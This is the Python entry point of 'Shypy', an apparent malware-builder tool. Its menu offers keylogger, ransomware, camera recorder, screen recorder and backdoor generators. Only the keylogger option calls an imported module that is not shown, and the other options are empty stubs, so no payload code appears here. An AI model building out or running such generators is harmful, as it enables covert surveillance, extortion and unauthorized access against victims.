import sys
from packages.utils.utils import *
from packages.variables.variables import *

from packages.modules.keylogger_generator import Generator

class Shypy(Utils):
    def __init__(self) -> None:
        super().__init__()
    
    def run(self) -> None:
        """
        Runs the Shypy application.

        This method initiates the Shypy application by first checking for required modules
        using the `check_modules` method, then proceeds to the main menu using the `main` method.

        Returns:
            None
        """
        self.check_modules()
        self.main()
        
    def main(self) -> None:
        """
        Displays the main menu of the Shypy application.

        This method displays the main menu of the Shypy application, where users can select
        different modules or choose to exit the application.

        Returns:
            None
        """
        try:
            self.clear()
            print(f"""{COLOR["CYAN"]}      
████████████████████████████████████████████████████████████████████████████╗
╚══██╔══════════════════════════════════════════════════════════════════════╝
   ██║  ██╗  ██╗  ███████╗     ██████╗  ██╗  ██╗  ██╗  ██╗  ██████═╗ ██╗  ██╗ 
   ██║  ██╚══██║  ██╔════╝    ██╔════╝  ██╚══██║  ██╚══██║  ██╔══██║ ██╚══██║
   ██║  ███████║  ███████╗    ╚██████═╗ ███████║  ╚██████║  ██████╔╝ ╚██████║
   ██║  ██╔══██║  ██╔════╝     ╚════██║ ██╔══██║   ╚═══██║  ██╔═══╝   ╚══╗██║
   ██║  ██║  ██║  ███████╗    ███████╔╝ ██║  ██║  ██████╔╝  ██║          ║██║
   ╚═╝  ╚═╝  ╚═╝  ╚══════╝    ╚══════╝  ╚═╝  ╚═╝  ╚═════╝   ╚═╝         ╔███║
   ████████████████████████████████████████████████████████████████████████╔╝
   ╚═══════════════════════════════════════════════════════════════════════╝\n""")
            option = input(f'\t\t\t[Press "ENTER" To Continue] {COLOR["RESET"]}').lower()

            if option == "":
                self.menu()
                
            else:
                self.main()
        
        except KeyboardInterrupt:
            self.write(message="Exited from Shypy", level=2, delay=0, clear=True)
            sys.exit(1)

        except EOFError:
            self.write(message="Exited from Shypy", level=2, delay=0, clear=True)
            sys.exit(1)

            
    def menu(self) -> None:
        """
        Displays the module selection menu of the Shypy application.

        This method displays the module selection menu of the Shypy application, where users
        can choose different modules to use or exit the application.

        Returns:
            None
        """
        try:
            self.clear()
            print(f"""{COLOR['CYAN']}
            ╔════════════════════════════╦══════════════════════╦════════════════════════╗
            ║* Version    :     0.1     *║ Welcome To The Shypy ║*                      *║
            ╠════════════════════════════╩═════════╦════════════╩════════════════════════╣
            ║             Module Name              ║          Operating System           ║  
            ╠══════════════════════════════════════╬═════════════════════════════════════╣
            ║[1] Keylogger Generator               :    [ Windows | Linux | MacOS ]      ║
            ║[2] Ransomware Generator              :    [ Windows | Linux | MacOS ]      ║
            ║[3] Camera Recorder Generator         :    [ Windows | Linux | MacOS ]      ║
            ║[4] Screen Recorder Generator         :    [ Windows | Linux | MacOS ]      ║   
            ║[5] Back Door Generator               :    [ Windows | Linux | MacOS ]      ║
            ╠══════════════════════════════════════╬═════════════════════════════════════╣
            ║ "use" <num>                          : Used To Select Modules.             ║
            ║ "exit"                               : To Log Out Of ShyPy.                ║  
            ╠═════════════════════════╦════════════╩═══════════════╦═════════════════════╣
            ║*                       *║ Developed by Atahan Poyraz ║*                   *║
            ╚═════════════════════════╩════════════════════════════╩═════════════════════╝\n""")
        
            option = input(f"{COLOR["CYAN"]}Shypy >> {COLOR["RESET"]}").lower()
            try:
                if option.startswith("use"):                
                    if option.split(" ")[1] in ("1", "keylogger generator"):
                        Generator().run()
                        
                    elif option.split(" ")[1] in ("2", "ransomware generator"):
                        ...
                    
                    elif option.split(" ")[1] in ("3", "camera recorder generator"):
                        ...
                        
                    elif option.split(" ")[1] in ("4", "screen recorder generator"):
                        ...
                        
                    elif option.split(" ")[1] in ("5", "backdoor generator"):
                        ...
                        
                    else:
                        self.write(message="Invalid Module", level=4, delay=1, clear=True)
                        self.menu()
            
                elif option == "exit":
                    self.write(message="Exited from Shypy", level=2, delay=0, clear=True)

                else:
                    self.write(message="Invalid Option", level=4, delay=1, clear=True)
                    self.menu()
                    
            except IndexError:
                self.write(message="Invalid Module", level=4, delay=1, clear=True)
                self.menu()

        except KeyboardInterrupt:
            self.write(message="Exited from Shypy", level=2, delay=0, clear=True)
            sys.exit(1)

if __name__ == "__main__":
    Shypy().run()